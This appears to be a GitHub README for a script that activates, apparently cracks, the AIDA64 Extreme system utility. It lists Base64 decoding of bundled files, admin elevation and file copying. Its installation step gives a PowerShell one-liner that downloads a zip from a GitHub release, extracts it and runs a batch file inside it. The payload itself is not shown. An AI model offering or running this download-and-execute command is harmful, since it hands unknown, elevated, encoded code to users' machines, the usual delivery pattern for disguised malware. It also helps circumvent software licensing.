# **AIDA64 Extreme Activation Script**

This script simplifies the process of activating AIDA64 Extreme by automating the activation process with a single click. It includes features for copying necessary files and handling administrative privileges.

## 💪 Features

- Base64 Decoding: Decodes Base64-encoded files required for activation.
- Administrative Privileges: Requests elevation to run the script with administrative privileges.
- File Operations: Copies necessary files to the AIDA64 Extreme installation directory.
- Interactive: Provides a simple menu for user interaction and options.

## 🛠️ Installation

1. **Open PowerShell**

2. Run the following command in PowerShell to download and execute the activation script:

   ```powershell
   irm https://github.com/SomeMedic/thesaintaida/releases/download/alpha-1.0.2/TheSaintAida.zip -OutFile TheSaintAida.zip; Expand-Archive TheSaintAida.zip -DestinationPath . -Force; cmd.exe /c .\TheSaintAida\script.bat
   ```
